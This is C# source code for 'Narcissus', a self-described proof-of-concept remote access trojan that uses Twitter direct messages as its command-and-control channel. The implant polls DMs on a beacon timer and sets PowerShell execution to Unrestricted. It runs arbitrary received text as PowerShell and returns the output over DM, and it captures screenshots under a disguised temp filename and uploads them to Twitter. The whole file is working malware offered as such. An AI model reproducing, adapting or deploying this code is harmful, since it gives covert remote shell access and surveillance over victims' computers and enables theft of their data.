/*
 * AUTHOR: 2d Lt Braden Laverick
 * ORGANIZATION: 92 COS/DOA
 * PROJECT: Narcissus
 * DESCRIPTION: This project is a proof of concept for a twitter-based remote access trojan. The tool is controlled through
 * direct messages in twitter. The bot requires access to one account to receive and send direct messages.
 */

using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace narcissus
{
    public class Target
    {
        public string recipient_id { get; set; }
    }


    public class Entities
    {
        public List<object> hashtags { get; set; }
        public List<object> symbols { get; set; }
        public List<object> user_mentions { get; set; }
        public List<object> urls { get; set; }
    }


    public class MessageData
    {
        public string text { get; set; }
        public Entities entities { get; set; }
    }


    public class MessageCreate
    {
        public Target target { get; set; }
        public string sender_id { get; set; }
        public string source_app_id { get; set; }
        public MessageData message_data { get; set; }
    }


    public class Event
    {
        public string type { get; set; }
        public string id { get; set; }
        public string created_timestamp { get; set; }
        public MessageCreate message_create { get; set; }
    }


    public class __invalid_type__16162985
    {
        public string id { get; set; }
        public string name { get; set; }
        public string url { get; set; }
    }


    public class Apps
    {
        public __invalid_type__16162985 __invalid_name__16162985 { get; set; }
    }


    public class TwitterResponse
    {
        public List<Event> events { get; set; }
        public Apps apps { get; set; }
    }



    public class UploadResponse
    {
        public long media_id { get; set; }
        public string media_id_string { get; set; }
        public int expires_after_secs { get; set; }
    }



    class Narcissus
    {
        static Narcissus narcissusMain = new Narcissus();
        static HttpClient narcissusDMClient = new HttpClient();
        static HttpClient narcissusImageClient = new HttpClient();
        static readonly string apiVar = Environment.GetEnvironmentVariable("narcissusKeys", EnvironmentVariableTarget.User);
        static readonly string[] apiKeys = apiVar.Split(';');
        static readonly string oauthKey = apiKeys[0];
        static readonly string oauthToken = apiKeys[2];
        static readonly string oauthKeySecret = apiKeys[1];
        static readonly string oauthTokenSecret = apiKeys[3];


        public async Task<string> GetAsync(HttpClient requestClient, string url)
        {            
            using (var response = await requestClient.GetAsync(url))
            {
                return await response.Content.ReadAsStringAsync();
            }
        }


        public async Task<string> PostAsync(HttpClient requestClient, string url, HttpContent content)
        {
            using (var response = await requestClient.PostAsync(url, content))
            {
                return await response.Content.ReadAsStringAsync();
            }
        }


        public string Build_AuthHeader(string nonce, string timestamp, string method, string url, Dictionary<string, string> requestParams=null)
        {
            Dictionary<string, string> authorizationParams = new Dictionary<string, string>();
            authorizationParams.Add("oauth_nonce", nonce);
            authorizationParams.Add("oauth_timestamp", timestamp);
            authorizationParams.Add("oauth_consumer_key", oauthKey);
            authorizationParams.Add("oauth_signature_method", "HMAC-SHA1");
            authorizationParams.Add("oauth_token", oauthToken);
            authorizationParams.Add("oauth_version", "1.0");

            Dictionary<string, string> signatureParams = new Dictionary<string, string>(authorizationParams);
            if(requestParams != null)
            {
                foreach(KeyValuePair<string,string> paramPair in requestParams)
                {
                    signatureParams.Add(paramPair.Key, paramPair.Value);
                }
            }

            string signatureBaseString = "";
            List<string> paramKeys = signatureParams.Keys.ToList();
            paramKeys.Sort();
            foreach(string requestParam in paramKeys)
            {
                if(requestParam == paramKeys.First())
                {
                    signatureBaseString = signatureBaseString + 
                        Uri.EscapeDataString(requestParam) +
                        "=" +
                        Uri.EscapeDataString(signatureParams[requestParam]);
                } else
                {
                    signatureBaseString = signatureBaseString +
                        "&" +
                        Uri.EscapeDataString(requestParam) +
                        "=" +
                        Uri.EscapeDataString(signatureParams[requestParam]);
                }  
            }

            string signatureString = String.Format("{0}&{1}&{2}",
                method,
                Uri.EscapeDataString(url),
                Uri.EscapeDataString(signatureBaseString));

            byte[] signingKey = Encoding.UTF8.GetBytes(Uri.EscapeDataString(oauthKeySecret) + 
                "&" + 
                Uri.EscapeDataString(oauthTokenSecret));

            HMACSHA1 oauthSigner = new HMACSHA1(signingKey);
            byte[] oauthHashBytes = oauthSigner.ComputeHash(Encoding.UTF8.GetBytes(signatureString));
            string oauthSignature = Convert.ToBase64String(oauthHashBytes);

            authorizationParams.Add("oauth_signature", oauthSignature);

            string headerString = "";
            List<string> headerKeys = authorizationParams.Keys.ToList();
            headerKeys.Sort();
            foreach(string headerParam in headerKeys)
            {   
                if(headerParam == headerKeys.Last())
                {
                    headerString = headerString +
                    Uri.EscapeDataString(headerParam) +
                    "=" +
                    "\"" +
                    Uri.EscapeDataString(authorizationParams[headerParam]) +
                    "\"";
                } else
                {
                    headerString = headerString +
                    Uri.EscapeDataString(headerParam) +
                    "=" +
                    "\"" +
                    Uri.EscapeDataString(authorizationParams[headerParam]) +
                    "\", ";
                }
            }

            return headerString;
        }


        public string Receive_DM()
        {
            string method = "GET";
            string dmReceiveUrl = "1.1/direct_messages/events/list.json";

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusDMClient.BaseAddress.ToString() + dmReceiveUrl);
          
            narcissusDMClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);
            string twitterResponse = narcissusMain.GetAsync(narcissusDMClient, dmReceiveUrl).Result;

            return twitterResponse;
        }


        public string Send_DM(string recipientId, string message, string mediaType = null, string mediaID = null)
        {
            string method = "POST";
            string dmSendUrl = "1.1/direct_messages/events/new.json";
            Dictionary<string, string> sendDMParams = new Dictionary<string, string>();
            sendDMParams.Add("type", "message_create");
            sendDMParams.Add("message_create.target.recipient_id", recipientId);
            sendDMParams.Add("message_create.message_data", message);

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusDMClient.BaseAddress.ToString() + dmSendUrl);

            string postData = "{\"event\": " +
                "{" +
                "\"type\": \"message_create\", " +
                "\"message_create\": {" +
                    "\"target\": {\"recipient_id\": " + "\"" + sendDMParams["message_create.target.recipient_id"] + "\"" + "}," +
                    "\"message_data\": {\"text\": " + "\"" + sendDMParams["message_create.message_data"] + "\"";

            if(mediaType != null && mediaID != null)
            {
                postData = postData + ", \"attachment\": {\"type\": \"" + mediaType + "\", \"media\": {\"id\": \"" + mediaID + "\" }}";
            }

            postData = postData + "}}}}";

            HttpContent messageContent = new StringContent(postData);

            narcissusDMClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);
            narcissusDMClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue("application/json"));

            string twitterResponse = narcissusMain.PostAsync(narcissusDMClient, dmSendUrl, messageContent).Result;

            return twitterResponse;
        }

        public void GetScreenshot(string targetPath)
        {
            Bitmap screenBmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using(Graphics g = Graphics.FromImage(screenBmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                screenBmp.Save(targetPath);
            }
        }

        public string InitImageUpload(string imageLocation, long imageSize)
        {
            string method = "POST";
            string initUploadUrl = "1.1/media/upload.json";

            Dictionary<string, string> initUploadParams = new Dictionary<string, string>();
            initUploadParams.Add("command", "INIT");
            initUploadParams.Add("total_bytes", imageSize.ToString());
            initUploadParams.Add("media_type", "image/png");
            initUploadParams.Add("media_category", "dm_image");

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusImageClient.BaseAddress.ToString() + initUploadUrl, initUploadParams);

            narcissusImageClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);

            FormUrlEncodedContent initParamsFormatted = new FormUrlEncodedContent(initUploadParams);

            Task<string> initPost = narcissusMain.PostAsync(narcissusImageClient, initUploadUrl, initParamsFormatted);
            initPost.Wait();
            string twitterResponse = initPost.Result;


            return twitterResponse;
        }


        public void AppendImageData(byte[] imageContent, string mediaId)
        {
            string method = "POST";
            string uploadUrl = "1.1/media/upload.json";

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusImageClient.BaseAddress.ToString() + uploadUrl);

            narcissusImageClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);
            //narcissusImageClient.DefaultRequestHeaders.TransferEncoding.Add(new System.Net.Http.Headers.TransferCodingHeaderValue("BASE64"));
            //narcissusImageClient.DefaultRequestHeaders.TransferEncodingChunked = true;

     

            int chunkSize = 32766;
            int nChunks = imageContent.Length / chunkSize;
            int leftoverData = imageContent.Length % chunkSize;
            int lastIndex = 0;

            for (int i = 0; i < nChunks; i++)
            {
                using (MultipartFormDataContent appendForm = new MultipartFormDataContent())
                {
                    appendForm.Add(new StringContent("APPEND"), "\"command\"");
                    appendForm.Add(new StringContent(mediaId), "\"media_id\"");
                    appendForm.Add(new ByteArrayContent(imageContent, i * chunkSize, chunkSize), "\"media\"");
                    appendForm.Add(new StringContent(i.ToString()), "\"segment_index\"");
                    Task<string> appendPost = narcissusMain.PostAsync(narcissusImageClient, uploadUrl, appendForm);
                    appendPost.Wait(); ;
                    lastIndex = i;
                }
            }
            if (leftoverData != 0)
            {
                using (MultipartFormDataContent appendForm = new MultipartFormDataContent())
                {
                    appendForm.Add(new StringContent("APPEND"), "\"command\"");
                    appendForm.Add(new StringContent(mediaId), "\"media_id\"");
                    appendForm.Add(new ByteArrayContent(imageContent, (lastIndex + 1) * chunkSize, leftoverData), "\"media\"");
                    appendForm.Add(new StringContent((lastIndex + 1).ToString()), "\"segment_index\"");
                    Task<string> appendPost = narcissusMain.PostAsync(narcissusImageClient, uploadUrl, appendForm);
                    appendPost.Wait();
                }
            }
        }


        public string FinalizeImageUpload(string mediaId)
        {
            string method = "POST";
            string uploadUrl = "1.1/media/upload.json";

            Dictionary<string, string> finalizeParams = new Dictionary<string, string>();
            finalizeParams.Add("command", "FINALIZE");
            finalizeParams.Add("media_id", mediaId);

            string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
            UInt32 timestamp = (UInt32)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
            string formTimestamp = timestamp.ToString();
            string authenticationHeader = Build_AuthHeader(nonce, formTimestamp, method, narcissusImageClient.BaseAddress.ToString() + uploadUrl, finalizeParams);

            narcissusImageClient.DefaultRequestHeaders.Authorization = new System.Net.Http.Headers.AuthenticationHeaderValue("OAuth", authenticationHeader);

            FormUrlEncodedContent finalizeParamsFormatted = new FormUrlEncodedContent(finalizeParams);

            Task<string> finalizePost = narcissusMain.PostAsync(narcissusImageClient, uploadUrl, finalizeParamsFormatted);
            finalizePost.Wait();
            string twitterResponse = finalizePost.Result;

            return twitterResponse;
        }


        public string UploadImage(string imagePath)
        {
            byte[] imageContent = File.ReadAllBytes(imagePath);
            JavaScriptSerializer responseParser = new JavaScriptSerializer();
            string twitterResponse = narcissusMain.InitImageUpload(imagePath, imageContent.LongLength);
            UploadResponse responseData = responseParser.Deserialize<UploadResponse>(twitterResponse);

            narcissusMain.AppendImageData(imageContent, responseData.media_id_string);

            string finalizeResponse = narcissusMain.FinalizeImageUpload(responseData.media_id_string);

            return responseData.media_id_string;
        }


        public string RunPowerShell(Runspace rs, string script)
        {
            Pipeline nPipeline = rs.CreatePipeline();
            nPipeline.Commands.AddScript(script);
            nPipeline.Commands.Add("Out-String");
            string shellOut = "";
            try
            {
                //error handle system errors and null returns
                foreach (PSObject shellResult in nPipeline.Invoke())
                {
                    if (shellResult == null)
                    {
                        shellOut = shellOut += "The command supplied returned null";
                    }
                    else
                    {
                        shellOut = shellOut + Regex.Replace(shellResult.ToString(), @"\t|\n|\r", "") + " ";
                    }
                }
                nPipeline.Commands.Clear();
            }
            catch (PSInvalidOperationException)
            {
                shellOut = "An invalid PowerShell command was given";
            }
            nPipeline.Stop();
            return shellOut;
        }


        public static void MessageListener()
        {
            string twitterResponse;
            JavaScriptSerializer messageParser = new JavaScriptSerializer();
            TwitterResponse responseData;
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
            DateTime latestTime = DateTime.Now.ToUniversalTime();

            int beaconTimer = 60;

            RunspaceConfiguration nRsConfig = RunspaceConfiguration.Create();
            Runspace narcissusRs = RunspaceFactory.CreateRunspace(nRsConfig);
            narcissusRs.Open();
            RunspaceInvoke nRsInvoker = new RunspaceInvoke(narcissusRs);
            nRsInvoker.Invoke("Set-ExecutionPolicy -Scope Process Unrestricted");

            while (true)
            {
                try
                {
                    twitterResponse = narcissusMain.Receive_DM();
                    responseData = messageParser.Deserialize<TwitterResponse>(twitterResponse);
                    foreach (Event dmEvent in responseData.events)
                    {
                        if (epoch.AddMilliseconds(Convert.ToDouble(dmEvent.created_timestamp)) > latestTime && dmEvent.message_create.sender_id != "35088627")
                        {
                            // Reset latest time
                            latestTime = epoch.AddMilliseconds(Convert.ToDouble(dmEvent.created_timestamp));
                            Console.WriteLine(latestTime.ToString());
                            Console.WriteLine(dmEvent.message_create.message_data.text);

                            // Narcissus custom commands
                            if (dmEvent.message_create.message_data.text == "Kill")
                            {
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Acknowledged. Killing narcissus agent.");
                                return;
                            }
                            else if (dmEvent.message_create.message_data.text.Split(' ')[0] == "Set-Beacon")
                            {
                                beaconTimer = Convert.ToInt32(dmEvent.message_create.message_data.text.Split(' ')[1]);
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Acknowledged. Setting beacon to " + beaconTimer.ToString() + " seconds.");
                            }
                            else if (dmEvent.message_create.message_data.text == "Get-Screenshot")
                            {
                                string targetPath = Path.GetTempPath() + "mssccm.png";
                                narcissusMain.GetScreenshot(targetPath);
                                string screenshotId = narcissusMain.UploadImage(targetPath);
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Got screenshot.", "media", screenshotId);
                                File.Delete(targetPath);
                            }
                            else
                            {
                                // Run custom PowerShell command                              
                                string output = narcissusMain.RunPowerShell(narcissusRs, dmEvent.message_create.message_data.text);
                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, output);
                            }
                        }
                    }
                    Thread.Sleep(beaconTimer * 1000);
                }
                catch (ThreadAbortException)
                {
                    narcissusRs.Close();
                    Console.WriteLine("Narcissus listener exited safely");
                    return;
                }
            } 
        }

        static void Main(string[] args)
        {
            narcissusDMClient.BaseAddress = new Uri("https://api.twitter.com/");
            narcissusImageClient.BaseAddress = new Uri("https://upload.twitter.com/");
            Thread listenerThread = new Thread(new ThreadStart(MessageListener));
            listenerThread.Start();
            listenerThread.Join();
        }
    }
}
